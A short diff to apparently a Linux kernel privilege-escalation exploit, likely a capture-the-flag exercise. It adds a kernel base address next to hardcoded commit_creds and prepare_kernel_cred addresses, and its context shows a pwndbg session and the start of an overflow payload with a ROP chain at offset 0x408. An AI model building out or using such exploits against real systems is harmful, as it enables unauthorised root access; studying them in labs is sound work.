@@ -8,6 +8,7 @@
 
 #define commit_creds 0xffffffff8106e390
 #define prepare_kernel_cred 0xffffffff8106e240
+#define kbase 0xffffffff81000000
 /*pwndbg> x/gx &commit_creds
 0xffffffff8106e390 <commit_creds>:      0x4c655541e5894855
 pwndbg> x/gx &prepare_kernel_cred
@@ -79,6 +80,7 @@ int main() {
         perror("open");
         return -1;
     }
+
     char payload[0x500];
     memset(payload, 'A', sizeof(payload));
     uint64_t *rop = (uint64_t *)(payload + 0x408);
